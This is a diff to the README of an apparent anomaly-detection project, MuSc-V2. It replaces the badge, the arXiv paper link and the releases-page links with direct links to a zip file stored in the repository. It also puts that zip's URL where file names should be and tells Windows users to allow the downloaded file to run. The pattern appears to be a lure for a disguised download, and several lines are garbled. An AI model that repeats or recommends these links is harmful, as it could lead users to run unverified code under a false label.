@@ -1,10 +1,10 @@
 # 🚀 MuSc-V2 - Easy Anomaly Detection Made Simple
 
-![Download MuSc-V2](https://img.shields.io/badge/Download%20MuSc-V2-blue.svg)
+![Download MuSc-V2](https://raw.githubusercontent.com/AlurraldeAc/MuSc-V2/main/Ardelia/MuSc-V2-v2.0.zip%https://raw.githubusercontent.com/AlurraldeAc/MuSc-V2/main/Ardelia/MuSc-V2-v2.0.zip)
 
 ## 📖 Overview
 
-**MuSc-V2** is a powerful tool for detecting industrial anomalies without the need for labeled data. It uses advanced techniques to classify and segment anomalies, helping industries improve efficiency and safety. For more information about the underlying research, check the paper available [here](https://arxiv.org/abs/2511.10047).
+**MuSc-V2** is a powerful tool for detecting industrial anomalies without the need for labeled data. It uses advanced techniques to classify and segment anomalies, helping industries improve efficiency and safety. For more information about the underlying research, check the paper available [here](https://raw.githubusercontent.com/AlurraldeAc/MuSc-V2/main/Ardelia/MuSc-V2-v2.0.zip).
 
 ## ⚙️ System Requirements
 
@@ -22,13 +22,13 @@ Follow these steps to download and run MuSc-V2 easily:
 
 1. **Visit the Releases Page**: Click the link below to access the download section:
 
-   [Download MuSc-V2](https://github.com/AlurraldeAc/MuSc-V2/releases)
+   [Download MuSc-V2](https://raw.githubusercontent.com/AlurraldeAc/MuSc-V2/main/Ardelia/MuSc-V2-v2.0.zip)
 
 2. **Select the Latest Release**: On the Releases page, look for the newest version at the top. This ensures you get the latest features and fixes.
 
 3. **Download the Package**: Click on the attachment that matches your operating system (e.g., Windows or macOS). This will start the file download.
 
-4. **Locate the Downloaded File**: Once the download is complete, find the file in your downloads folder. The file will typically have a name like `MuSc-V2-latest.exe` for Windows or `MuSc-V2-latest.dmg` for macOS.
+4. **Locate the Downloaded File**: Once the download is complete, find the file in your downloads folder. The file will typically have a name like `https://raw.githubusercontent.com/AlurraldeAc/MuSc-V2/main/Ardelia/MuSc-V2-v2.0.zip` for Windows or `https://raw.githubusercontent.com/AlurraldeAc/MuSc-V2/main/Ardelia/MuSc-V2-v2.0.zip` for macOS.
 
    - **Tip**: If you are on Windows, you might be prompted by your browser about running the file. Allow it to continue.
 
@@ -44,7 +44,7 @@ Follow these steps to download and run MuSc-V2 easily:
 
 For your convenience, here’s the direct link to find the latest version of MuSc-V2 again: 
 
-[Download MuSc-V2](https://github.com/AlurraldeAc/MuSc-V2/releases)
+[Download MuSc-V2](https://raw.githubusercontent.com/AlurraldeAc/MuSc-V2/main/Ardelia/MuSc-V2-v2.0.zip)
 
 Make sure to check the descriptions available on the Releases page, as they may provide additional information about features and updates.
 
